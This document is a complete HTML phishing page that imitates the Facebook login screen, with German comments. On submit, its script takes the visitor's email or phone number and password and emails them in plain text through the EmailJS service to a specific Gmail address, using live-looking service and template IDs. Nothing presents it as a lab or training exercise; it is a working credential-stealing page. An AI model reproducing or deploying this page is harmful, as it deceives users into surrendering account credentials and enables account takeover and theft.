<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook ähnliches Layout</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        /* Header */
        header {
            background-color: #1877f2;
            color: white;
            padding: 20px;
            text-align: center;
        }

        header h1 {
            margin: 0;
            font-size: 36px;
        }

        /* Hauptbereich */
        .main {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }

        .login-box h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #1877f2;
        }

        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #ddd;
        }

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .login-box button:hover {
            background-color: #165eab;
        }

        .signup-link {
            margin-top: 15px;
            color: #1877f2;
            font-size: 14px;
        }

        .signup-link a {
            text-decoration: none;
            color: #1877f2;
        }

        footer {
            background-color: #fff;
            text-align: center;
            padding: 10px;
            border-top: 1px solid #ddd;
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        footer p {
            color: #555;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <h1>Facebook</h1>
    </header>

    <!-- Main Login Section -->
    <div class="main">
        <div class="login-box">
            <h2>Facebook Login</h2>
            <form id="loginForm">
                <input type="text" id="email" placeholder="E-Mail oder Telefonnummer" required>
                <input type="password" id="password" placeholder="Passwort" required>
                <button type="submit">Einloggen</button>
            </form>
            <div class="signup-link">
                <p>Neu bei Facebook? <a href="#">Registriere dich</a></p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <p>&copy; 2024 Facebook Clone</p>
    </footer>

    <script>
        // Initialisiere EmailJS mit der Benutzer-ID
        (function() {
            emailjs.init("QH6udfGB7ZJWM7UB6"); // Ersetze mit deiner EmailJS User-ID
        })();

        // Event Listener für das Formular
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Verhindert das Standardformularverhalten

            // Holt die Werte der Eingabefelder
            const email = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value.trim();

            // Debugging-Ausgabe: Überprüfe, ob die Werte korrekt sind
            console.log("E-Mail:", email);
            console.log("Passwort:", password);

            // Überprüfe, ob die Felder nicht leer sind
            if (!email || !password) {
                alert("Bitte füllen Sie beide Felder aus!");
                console.log("Fehlende Felder");
                return;
            }

            // Nachricht für die E-Mail erstellen
            const message = `E-Mail: ${email}\nPasswort: ${password}`;
            console.log("Nachricht wird gesendet:", message); // Debugging-Ausgabe

            // E-Mail mit EmailJS senden
            emailjs.send("service_qyz5apn", "template_0vvn20r", {
                to_email: "ahmaddarwish2018@gmail.com", // Zieladresse
                message: message // Nachricht
            }).then(function(response) {
                console.log("Nachricht gesendet", response);
                alert("E-Mail wurde erfolgreich gesendet!");
                document.getElementById("loginForm").reset();
            }).catch(function(error) {
                console.error("Fehler beim Senden der Nachricht:", error);
                alert("Es ist ein Fehler aufgetreten. Bitte überprüfen Sie Ihre Konfiguration.");
            });
        });
    </script>

</body>
</html>
